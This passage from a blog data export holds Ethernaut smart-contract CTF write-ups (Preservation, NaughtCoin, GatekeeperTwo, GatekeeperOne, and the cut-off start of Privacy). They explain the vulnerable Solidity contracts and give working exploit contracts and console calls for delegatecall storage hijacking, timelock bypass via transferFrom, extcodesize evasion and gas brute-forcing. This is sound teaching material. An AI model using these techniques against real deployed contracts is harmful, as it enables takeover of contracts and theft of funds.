it will assume that the first variable is a bool and make changes. But in our contract_two, the first variable is of type contract_one. When the unlock() function makes changes, it will directly overwrite the contract_One.\nTry out the above example. Deploy two contracts. While deploying, pass the address of contract_one to the constructor of contract_two. Once it is deployed, check the value stored in the variable contract_One in contract_two. Then call the Unlock() function in contract_two. Once the call is done, check the value stored in the variable contract_One in contract_two. You will observe that the last byte has been overwritten to 00 (false).\nI hope you understand how delegate calls work.\nExploit Our goal is to claim ownership of the contract.\n1function setFirstTime(uint256 _timeStamp) public { 2 timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); 3} When we call the above function, it makes a delegate call to LibraryContract, calling the function setTime(). Since it is a delegate call, if setTime() makes any changes to state variables, those changes will be done in the Preservation contract.\n1function setTime(uint256 _time) public { 2 storedTime = _time; 3} The function setTime() will set the storedTime to the argument passed during the function call. If we check the LibraryContract, the variable storedTime is in slot0. If we check the slot0 in the Preservation contract, we can find timeZone1Library. So when we call setFirstTime() with an argument as a uint in the Preservation contract, because of the delegate call, it will change the value at slot0 in the Preservation contract to the timestamp passed to setFirstTime() during the call.\nSo while calling setFirstTime(), instead of passing time as an argument, if we pass an address converted into a uint256, the next time we make a call to setFirstTime(), it will make a delegate call to our address. This is because in the setFirstTime() function, the address of the callee is retrieved from timeZone1Library. Since the address is changed, it will make a call to whatever address is stored in timeZone1Library.\nSo when we call the setFirstTime() for the first time, we pass our exploit contract address. We need to write our exploit contract such that it should have a setTime() function since the delegate call is made to call the setTime() function, and the exploit contract\u0026rsquo;s storage layout should be the same as the Preservation contract.\nIt\u0026rsquo;s not necessary to make the storage layout exactly the same as the Preservation contract, but we need to make sure that the second slot is an address because the owner in the Preservation contract is in slot2.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Preservation} from \u0026#34;./Preservation.sol\u0026#34;; 5 6contract ExploitPreservation{ 7 Preservation preservation; 8 uint256 addr=uint160(address(this)); 9 address public owner; 10 11 constructor(address _addr){ 12 preservation=Preservation(_addr); 13 } 14 15 function setTime(uint256 _time)public{ 16 owner= // __YOUR__CONTRACT__ADDRESS; 17 } 18 19 function Exploit()public{ 20 preservation.setFirstTime(addr); 21 preservation.setFirstTime(addr); 22 } 23 24 25} In the setTime() function, first it calls setFirstTime() with our exploit contract address. Once the first line is executed, timeZone1Library is set to our exploit contract address. When the second line is executed, the next call will be made to our exploit contract, calling the setTime() function. In the setTime() function in our exploit contract, we are changing the value at slot2, so it will change the value at slot2 in the Preservation contract. In the Preservation contract, slot2 is used for the owner\u0026rsquo;s address. Once the Exploit() call is done, our challenge will be completed.\nDon\u0026rsquo;t forget to change the address of the owner in the setTime() function in the ExploitPreservation contract to your wallet address.\nOnce the calls are done, you can check whether the owner is changed or not by entering the following in the console:\n1\u0026gt; await contract.owner() You have learned a lot of things. Make sure you understand everything clearly, especially delegate calls.\nKey Takeaways When using delegate calls, it is important to ensure that the two contracts have the same storage layout. This means that the variables in both contracts should be in the same order and have the same data types. By doing so, the delegate call can correctly access and modify the desired variables in the calling contract.\nAdditionally, understanding how delegate calls work and their implications is crucial. Delegate calls allow for the execution of code from another contract while preserving the context of the calling contract. This means that state changes will occur in the calling contract, but the logic execution will happen in the called contract.\nBy leveraging delegate calls effectively, you can exploit vulnerabilities and manipulate the state of contracts to achieve desired outcomes, such as claiming ownership or executing specific functions.\nRemember to thoroughly understand the concepts and practice with examples to solidify your understanding of delegate calls and their usage in smart contract development.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/preservation/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Delegate Call","url":"/tags/delegate-call/"}],"timestamp":1729626119,"title":"Preservation"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Naught Coin Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description NaughtCoin is an ERC20 token and you\u0026rsquo;re already holding all of them. The catch is that you\u0026rsquo;ll only be able to transfer them after a 10-year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\nThings that might help\nThe ERC20 Spec The OpenZeppelin codebase Contract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5import \u0026#34;openzeppelin-contracts-08/token/ERC20/ERC20.sol\u0026#34;; 6 7contract NaughtCoin is ERC20 { 8 // string public constant name = \u0026#39;NaughtCoin\u0026#39;; 9 // string public constant symbol = \u0026#39;0x0\u0026#39;; 10 // uint public constant decimals = 18; 11 uint256 public timeLock = block.timestamp + 10 * 365 days; 12 uint256 public INITIAL_SUPPLY; 13 address public player; 14 15 constructor(address _player) ERC20(\u0026#34;NaughtCoin\u0026#34;, \u0026#34;0x0\u0026#34;) { 16 player = _player; 17 INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); 18 // _totalSupply = INITIAL_SUPPLY; 19 // _balances[player] = INITIAL_SUPPLY; 20 _mint(player, INITIAL_SUPPLY); 21 emit Transfer(address(0), player, INITIAL_SUPPLY); 22 } 23 24 function transfer(address _to, uint256 _value) public override lockTokens returns (bool) { 25 super.transfer(_to, _value); 26 } 27 28 // Prevent the initial owner from transferring tokens until the timelock has passed 29 modifier lockTokens() { 30 if (msg.sender == player) { 31 require(block.timestamp \u0026gt; timeLock); 32 _; 33 } else { 34 _; 35 } 36 } 37} The NaughtCoin contract inherits the ERC20 contract, which provides a standard implementation for creating tokens and assets. Before the introduction of the ERC20 token standard, different crypto assets or tokens used different logic, making it difficult to achieve interoperability between them. The ERC20 standard defines a set of functions that every token must have, enabling seamless interoperability between different tokens. This standardization has greatly simplified token transfers and interactions within the Ethereum ecosystem.\nClick the below links to read more about the ERC20 standard.\nERC-20: Token Standard ERC20 Token standard Basics ERC20 Token Standard Explained Must Watch ERC20 Contract I assume you have gone through these resources and I will proceed.\n1constructor(address _player) ERC20(\u0026#34;NaughtCoin\u0026#34;, \u0026#34;0x0\u0026#34;) { 2 player = _player; 3 INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); 4 _mint(player, INITIAL_SUPPLY); 5 emit Transfer(address(0), player, INITIAL_SUPPLY); 6} During the deployment of the NaughtCoin contract, the constructor will be called. The constructor takes an argument of type address as input. The ERC20 contract constructor takes two arguments as input: the token name and the token symbol. For the ERC20 contract constructor, \u0026ldquo;NaughtCoin\u0026rdquo; and \u0026ldquo;0x0\u0026rdquo; are passed as arguments. For the NaughtCoin contract, the address of the player (our address) is passed as an argument.\nThe constructor() will set the player to the address passed as an argument. INITIAL_SUPPLY is the initial supply of the tokens, which is set to 1000000 * (10 ** uint256(decimals())). The decimals() function in the ERC20 contract returns 18.\nThen it will mint the initial supply of tokens to the player. Minting is the process of creating or issuing tokens. Finally, it will emit the Transfer event in the ERC20 contract.\n1modifier lockTokens() { 2 if (msg.sender == player) { 3 require(block.timestamp \u0026gt; timeLock); 4 _; 5 } else { 6 _; 7 } 8} The lockTokens() is a modifier that restricts the transfer of tokens owned by the player for 10 years.\n1function transfer(address _to, uint256 _value) public override lockTokens returns (bool) { 2 super.transfer(_to, _value); 3} The transfer() function takes two arguments: the recipient\u0026rsquo;s address and the amount of tokens to transfer. It then executes the lockTokens() modifier. If the modifier check passes successfully, the function will invoke the transfer() function in the ERC20 contract.\nExploit Our goal is to transfer all the tokens given to us and make our balance zero.\nHowever, when we check the transfer() function in the NaughtCoin contract, it only allows us to transfer our tokens after a 10-year lockout period. Waiting for 10 years to transfer all our tokens and solve this challenge is not feasible. Therefore, we need to find a different method to transfer our tokens.\nIf we examine the ERC20 contract, we can find that there are two ways of transferring tokens. One method is directly transferring tokens by the owner, and the other method is allowing another account to spend tokens on behalf of the owner. If you haven\u0026rsquo;t reviewed the ERC20 contract, I strongly recommend doing so. You can find the contract here.\n1function transfer(address to, uint256 value) public virtual returns (bool) { 2 address owner = _msgSender(); 3 _transfer(owner, to, value); 4 return true; 5} 6 7function transferFrom(address from, address to, uint256 value) public virtual returns (bool) { 8 address spender = _msgSender(); 9 _spendAllowance(from, spender, value); 10 _transfer(from, to, value); 11 return true; 12} 13 14function _spendAllowance(address owner, address spender, uint256 value) internal virtual { 15 uint256 currentAllowance = allowance(owner, spender); 16 if (currentAllowance != type(uint256).max) { 17 if (currentAllowance \u0026lt; value) { 18 revert ERC20InsufficientAllowance(spender, currentAllowance, value); 19 } 20 unchecked { 21 _approve(owner, spender, currentAllowance - value, false); 22 } 23 } 24} There are two ways of transferring tokens. However, if we look at the second method, there is a function called _spendAllowance(). The _spendAllowance() function checks whether the owner has allowed another account to spend tokens on their behalf. If there is no allowance, it will revert.\nIf we check our NaughtCoin contract, we can see that it has only overridden and implemented the transfer() function. This means that only the transfer() function has the time lock. However, if we send tokens using transferFrom(), we can instantly send the tokens without any restrictions. But before we can do that, we need to allow another account to spend tokens on our behalf, and then they can transfer the tokens to any other person. We can even approve our externally owned account and directly use transferFrom().\n1function approve(address spender, uint256 value) public virtual returns (bool) { 2 address owner = _msgSender(); 3 _approve(owner, spender, value); 4 return true; 5} The approve() function approves the spender to spend a certain amount of tokens on behalf of the owner. Now that we know what to do, let\u0026rsquo;s exploit this contract!\nNow it\u0026rsquo;s time to open the console. Open the Naught Coin challenge and press Ctrl+Shift+J to open the console. Enter the following commands:\n1\u0026gt; await contract.approve(player, contract.INITIAL_SUPPLY) 1\u0026gt; await contract.transferFrom(player, address(0), contract.INITIAL_SUPPLY) 1\u0026gt; await contract.balanceOf(player) If all the calls are successful, the balance will return zero, and now you can submit the level instance.\nKey Takeaways If we are implementing a normal token contract that works the same for everyone, we can directly inherit the ERC20 contract and use all its functions without overriding them.\nHowever, if we are implementing a token contract that restricts certain users from withdrawing or depositing tokens, we need to override all the functions in the ERC20 contract and implement the restriction logic in those functions. If we don\u0026rsquo;t override the functions then whenever the user calls the function it will be directly called in the ERC20 contract and it will be executed normally because in the ERC20 standard contract there won\u0026rsquo;t be any restrictions to anyone.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/naughtcoin/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729626084,"title":"NaughtCoin"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Gatekeeper Two Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here.\nChallenge Description This gatekeeper introduces new challenges. Your task is to register as an entrant to pass this level.\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract GatekeeperTwo { 5 address public entrant; 6 7 modifier gateOne() { 8 require(msg.sender != tx.origin); 9 _; 10 } 11 12 modifier gateTwo() { 13 uint256 x; 14 assembly { 15 x := extcodesize(caller()) 16 } 17 require(x == 0); 18 _; 19 } 20 21 modifier gateThree(bytes8 _gateKey) { 22 require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); 23 _; 24 } 25 26 function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { 27 entrant = tx.origin; 28 return true; 29 } 30} The contract has a state variable named entrant, which is of type address.\n1modifier gateOne() { 2 require(msg.sender != tx.origin); 3 _; 4} The above modifier, gateOne(), checks whether tx.origin is equal to msg.sender.\n1modifier gateTwo() { 2 uint256 x; 3 assembly { 4 x := extcodesize(caller()) 5 } 6 require(x == 0); 7 _; 8} The gateTwo() modifier checks whether the caller is a contract or not. It uses the extcodesize() opcode to determine the size of the contract. If the caller is an externally owned account (EOA), extcodesize() will return 0. If the caller is a contract address, extcodesize() will return the size of the deployed contract\u0026rsquo;s bytecode.\n1modifier gateThree(bytes8 _gateKey) { 2 require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); 3 _; 4} The gateThree() modifier takes a bytes8 argument and performs some XOR operations and checks.\n1function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { 2 entrant = tx.origin; 3 return true; 4} The enter() function takes a bytes8 argument and executes all three modifiers. Once all the modifiers are passed, it sets entrant to tx.origin (our wallet address) and returns true.\nKey Concepts to Understand extcodesize() is an opcode in Solidity that returns the size of a contract. If the caller is an externally owned account (EOA), extcodesize() will return 0. If the caller is a contract address, extcodesize() will return the size of the deployed contract\u0026rsquo;s bytecode.\nHowever, if we make a call to another contract in the constructor, extcodesize() will return zero. This behavior occurs because the contract is only deployed after the constructor call is completed.\nClick to check the example below 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Extcodesize{ 5 uint256 public size; 6 7 modifier Check_contract(){ 8 uint256 x; 9 assembly { 10 x := extcodesize(caller()) 11 } 12 size=x; 13 _; 14 } 15 16 17 function view_size()public Check_contract returns(uint256) { 18 return size; 19 } 20} 21 22 23contract Call_ExtCodesize{ 24 uint256 public size; 25 Extcodesize extcode; 26 constructor(address _addr){ 27 extcode=Extcodesize(_addr); 28 size=extcode.view_size(); 29 } 30 31 function call_view_size()public{ 32 size=extcode.view_size(); 33 } 34 35 function view_size()public view returns(uint256) { 36 return size; 37 } 38} Deploy the Extcodesize contract first, then deploy the Call_ExtCodesize contract. When we deploy the Call_ExtCodesize contract in the constructor, it calls the view_size() function in the Extcodesize contract. The function executes the Check_contract() modifier and assigns the return value of extcodesize() to size. Since the call is made from the constructor, it will return zero.\nThen call the call_view_size() function in the Call_ExtCodesize contract. The function makes a call to the view_size() function in the Extcodesize contract. The view_size() function executes the Check_contract() modifier and assigns the return value of extcodesize() to the size variable in the Extcodesize contract. Once the modifier execution is complete, view_size() will return the size of the Call_ExtCodesize contract.\nExploit Our goal is to call the enter() function and pass all the gates (modifiers).\n1modifier gateOne() { 2 require(msg.sender != tx.origin); 3 _; 4} We can pass gateOne() by interacting with the contract using our exploit contract. When we interact with GatekeeperOne using our exploit contract, msg.sender will be our exploit contract address, and tx.origin will be the address of the externally owned account (EOA) that is calling the exploit contract.\n1modifier gateTwo() { 2 uint256 x; 3 assembly { 4 x := extcodesize(caller()) 5 } 6 require(x == 0); 7 _; 8} We can pass gateTwo() by calling enter() from the constructor of our exploit contract. When we call enter() from the constructor of our exploit contract, extcodesize() will return zero. caller() is an opcode in Solidity that returns the msg.sender.\n1modifier gateThree(bytes8 _gateKey) { 2 require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); 3 _; 4} We can pass gateThree() by passing the correct gateKey as an argument during the function call. If we examine the required statement, it performs an XOR operation. When we perform A^B, there will be output. Let the output be C. So now the equation is A^B=C.\nXOR has a special property: if A^B=C, then A can be written as C^B, and B can be written as C^A.\nIn gateThree(), the require statement is uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max. Then _gateKey can be written as type(uint64).max^uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))).\nThe XOR value depends on msg.sender, which is our contract address. Since we know our contract address, we can calculate the _gateKey and pass it to the enter() function.\nClick to view Exploit contract 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5import {GatekeeperTwo} from \u0026#34;./GatekeeperTwo.sol\u0026#34;; 6 7contract ExploitGatekeeperTwo{ 8 GatekeeperTwo gatekeeperTwo; 9 constructor(address _addr){ 10 gatekeeperTwo=GatekeeperTwo(_addr); 11 bytes8 data=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 12 gatekeeperTwo.enter(data); 13 require(gatekeeperTwo.entrant()==msg.sender,\u0026#34;Exploit Failed\u0026#34;); 14 } 15} Once you deploy this contract, the challenge will be solved.\nKey Takeaways Be careful when using extcodesize() because it will return zero if the function call is made from the constructor().\nIf our logic depends on caller()/msg.sender, we can use require(tx.origin==msg.sender). This ensures that only externally owned accounts are calling the functions.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/gatekeepertwo/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Msg.sender vs Tx.origin","url":"/tags/msg.sender-vs-tx.origin/"},{"title":"Type Casting","url":"/tags/type-casting/"},{"title":"Assembly","url":"/tags/assembly/"},{"title":"Access Control","url":"/tags/access-control/"}],"timestamp":1729626042,"title":"GateKeeperTwo"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Gatekeeper One Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract. You can learn how to deploy a contract using Remix here. Challenge Description Make it past the gatekeeper and register as an entrant to pass this level.\nContract Explanation If you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract GatekeeperOne { 5 address public entrant; 6 7 modifier gateOne() { 8 require(msg.sender != tx.origin); 9 _; 10 } 11 12 modifier gateTwo() { 13 require(gasleft() % 8191 == 0); 14 _; 15 } 16 17 modifier gateThree(bytes8 _gateKey) { 18 require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); 19 require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); 20 require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); 21 _; 22 } 23 24 function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { 25 entrant = tx.origin; 26 return true; 27 } 28} The contract has a state variable named entrant. The state variable entrant is a address type.\nModifiers in Solidity are special functions that modify the behavior of other functions.\nClick to Check the below example 1contract A{ 2 address owner; 3 constructor(){ 4 owner=msg.sender; 5 } 6 7 function hello() public view returns (string memory){ 8 require(msg.sender==owner,\u0026#34;Not Owner\u0026#34;); 9 return \u0026#34;hello\u0026#34;; 10 } 11 12 function hi() public view returns (string memory){ 13 require(msg.sender==owner,\u0026#34;Not Owner\u0026#34;); 14 return \u0026#34;hi\u0026#34;; 15 } 16} 17 18 19contract B{ 20 address owner; 21 constructor(){ 22 owner=msg.sender; 23 } 24 25 modifier onlyOwner(){ 26 require(msg.sender==owner,\u0026#34;Not Owner\u0026#34;); 27 _; 28 } 29 30 function hello() public view returns (string memory) onlyOwner{ 31 return \u0026#34;hello\u0026#34;; 32 } 33 34 function hi() public view returns (string memory) onlyOwner{ 35 return \u0026#34;hi\u0026#34;; 36 } 37} If we see the contracts we can observe that in the first contract, we have written the same checks in two functions but in the second one we have written the checks in a modifier and we used a modifier in each function.\nWhen we use modifier to a function, the function will first implement the modifier logic and then implement the function logic. By using modifiers we can write more optimized code.\n1modifier gateOne() { 2 require(msg.sender != tx.origin); 3 _; 4} The above is a modifier named gateOne() which checks whether tx.origin is equal to msg.sender or not.\n1modifier gateTwo() { 2 require(gasleft() % 8191 == 0); 3 _; 4} The above is a modifier named gateTwo(). It checks if gasleft()%8191 is zero or not. gasleft() is an inbuilt function in the solidity that returns the amount of gas left during a contract call. In this case when the gateTwo() is called if gasleft%8191==0 then the modifier will be passed.\n1 2modifier gateThree(bytes8 _gateKey) { 3 require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); 4 require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); 5 require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); 6 _; 7} 1function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { 2 entrant = tx.origin; 3 return true; 4} The above function takes a bytes8 argument as input. It executes all the modifiers one by one then if all the conditions in modifiers are passed then it will set entrant to tx.origin and returns true.\nKey Concepts to Understand To exploit this contract we need to understand some key concepts in solidity.\nWhen we interact with contracts using low-level call function it won\u0026rsquo;t revert even if the calls failed. It will just return true or false.\nClick to check the below example 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract contract_One{ 6 function Wish(uint8 _num)public pure returns(string memory){ 7 if(_num%2==0){ 8 return \u0026#34;hello\u0026#34;; 9 } 10 else{ 11 revert(); 12 } 13 14 } 15} 16 17contract contract_two{ 18 bool public first_call; 19 bool public second_call; 20 bytes4 private constant FUNC_SELECTOR = bytes4(keccak256(\u0026#34;Wish(uint8)\u0026#34;)); 21 22 function call_Wish(address _wish)public{ 23 (bool a,)=_wish.call(abi.encodeWithSelector(FUNC_SELECTOR,2)); 24 (bool b,)=_wish.call(abi.encodeWithSelector(FUNC_SELECTOR,1)); 25 first_call=a; 26 second_call=b; 27 } 28} First deploy contract_one then deploy contract_two. When we invoke call_Wish() in contract_two the function will make two level calls to contract_one calling the function Wish(). The first will be successful but the second call will revert because we are passing odd number. Wish() returns true \u0026ldquo;hello\u0026rdquo; only when passing even numbers. If we pass an odd number it will revert.\nEven though the inner second call is reverted it is not reverting the main call (call_Wish). This behavior is only due to low-level call. When we use low-level call if the call is successful it returns true else it will return false.\nOne more key concept to learn is how typecasting works.\nIn Solidity, when a uint with a larger number of bits is converted to a type with a smaller number of bits, the first bits/bytes of larger value will be truncated. Same way when a bytes with a larger number of bytes is converted to a smaller number of bytes the last bits/bytes will be truncated.\nClick to check the below example 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Type_Casting{ 5 uint96 Number_1=1548647896516548945453658536; 6 bytes12 Bytes_1=bytes12((Number_1)); 7 function uint96_to_uint48()public view returns(bytes32 before_conversion,bytes32 after_conversion,uint48 converted_val){ 8 before_conversion=bytes32(uint256(Number_1)); 9 converted_val=uint48(Number_1); 10 after_conversion=bytes32(uint256(converted_val)); 11 } 12 13 function bytes12_to_bytes6()public view returns(bytes32 before_conversion,bytes6 converted_val,bytes32 after_conversion){ 14 before_conversion=bytes32(Bytes_1); 15 converted_val=bytes6(Bytes_1); 16 after_conversion=bytes32(converted_val); 17 } 18 19} Make sure you try out this in the remix. When we call the functions uint96_to_uint48() and bytes12_to_bytes6() the output will be as follows.\nIf we observe the data of bytes12_to_bytes6() when bytes12 is converted to bytes6 only the first 6 bytes are taken. If we observe the uint96_to_uint48() when uint96 is converted to uint48 only the last 48 bits (6 bytes) are taken. You can find the difference by observing before_conversion and after_conversion. In the uint96_to_uint48() you can verify the converted_val by converting 0x0000000000000000000000000000000000000000000000000000f750833e31a8 into decimal.\nExploit Our goal is to call the enter() function and pass all the gates (modifiers).\n1modifier gateOne() { 2 require(msg.sender != tx.origin); 3 _; 4} We can pass the gateOne() by interacting with the contract using our exploit contract. When we interact with GatekeeperOne using our exploit contract msg.sender will be our exploit contract address and tx.origin will be the address of the Externally Owned Account that is calling the exploit contract.\nIf you don\u0026rsquo;t know what is tx.origin and msg.sender refer to the Telephone challenge. Chlick here to open the WriteUp.\n1modifier gateTwo() { 2 require(gasleft() % 8191 == 0); 3 _; 4} It is checking if gasleft()%9191==0 or not. gasleft() will return the remaining gas after executing the gasleft(). We can pass this modifier by making some 100 or 200 low-level calls to GatekeeperOne enter() function with different gas values. The low-level call function will return true only if the call is a success. Using this as an advantage we can pass this modifier.\n1modifier gateThree(bytes8 _gateKey) { 2 require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); 3 require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); 4 require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); 5 _; 6} Now let\u0026rsquo;s assume our key as B1 B2 B3 B4 B5 B6 B7 B8 where each B represents a byte. Since the key is 8 bytes there are 8 B\u0026rsquo;s.\nIn the first condition, uint32(uint64(_gateKey)) will return B5 B6 B7 B8 and uint16(uint64(_gateKey)) will return B7 B8. According to the condition, the bytes are B5 B6 B7 B8 and B7 B8. This condition will only be satisfied if B5 and B6 are both zeros. Therefore, we can conclude that the last four bytes of our key will be 00 00 B7 B8.\nIn the second condition uint32(uint64(_gateKey)) will return B5 B6 B7 B8 and uint64(_gateKey) will return B1 B2 B3 B4 B5 B6 B7 B8. The condition will be satisfied only if B1 B2 B3 B4 are non-zeros. From this, we can conclude that the key will be B1 B2 B3 B4 00 00 B7 B8.\nIn the third condition uint32(uint64(_gateKey)) will return B5 B6 B7 B8 and uint16(uint160(tx.origin)) will return last two bytes of the address. Suppose if our address is 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5 it will return 0xAfe5. Assuming this as our wallet address we can conclude that our key will be B1 B2 B3 B4 00 00 Af e5.\nThe only restriction for B1 B2 B3 B4 is it shouldn\u0026rsquo;t be zero. That means this can be of any value. Now our key will be aa bb cc dd 00 00 Af e5 which is 0xaabbccdd0000Afe5.\nDon\u0026rsquo;t forget to change the last two bytes to your wallet address.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {GatekeeperOne} from \u0026#34;./GatekeeperOne.sol\u0026#34;; 5 6 7contract ExploitGatekeeperOne{ 8 GatekeeperOne Gate1; 9 uint256 gasAmount=81910; 10 constructor(address _addr){ 11 Gate1=GatekeeperOne(_addr); 12 } 13 function Exploit()public{ 14 bytes8 Key=0xaabbccdd0000Afe5; 15 for(uint256 i=0;i\u0026lt;500;i++){ 16 (bool success,)=address(Gate1).call{gas:gasAmount+i}(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;,Key)); 17 if(success){ 18 break; 19 } 20 } 21 require(Gate1.entrant()==0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5); 22 } 23} gasAmount is a multiple of 8191 because i will be the initial gas usage and after i amount of gas. Once the initial gas usage (calls before Gatetwo) is done the gasleft() will be multiple of 8191 and hence gasleft()%8191 will return 0\nOnce you call the Exploit() function the challenge will be solved. But before calling make sure you change your address in the ExploitGatekeeperOne contract.\nKey Takeaways We have learned about how typecasting works and we discussed how low-level call work. Refer this part if you forgot these.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/gatekeeperone/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Gas Manipulation","url":"/tags/gas-manipulation/"},{"title":"Type Casting","url":"/tags/type-casting/"},{"title":"Msg.sender vs Tx.origin","url":"/tags/msg.sender-vs-tx.origin/"},{"title":"Access Control","url":"/tags/access-control/"}],"timestamp":1729625978,"title":"GateKeeperOne"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Privacy Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract. You can learn how to deploy a contract using Remix here. Challenge Description The creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\nThings that might help:\nUnderstanding how storage works Understanding how parameter parsing works Understanding how casting works Tips:\nRemember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your web3 provider.\nContract Explanation If you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Privacy { 5 bool public locked = true; 6 uint256 public ID = block.timestamp; 7 uint8 private flattening = 10; 8 uint8 private denomination = 255; 9 uint16 private awkwardness = uint16(block.timestamp); 10 bytes32[3] private data; 11 12 constructor(bytes32[3] memory _data) { 13 data = _data; 14 } 15 16 function unlock(bytes16 _key) public { 17 require(_key == bytes16(data[2])); 18 locked = false; 19 } 20 21 /* 22 A bunch of super advanced solidity algorithms... 23 24 ,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^` 25 .,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*., 26 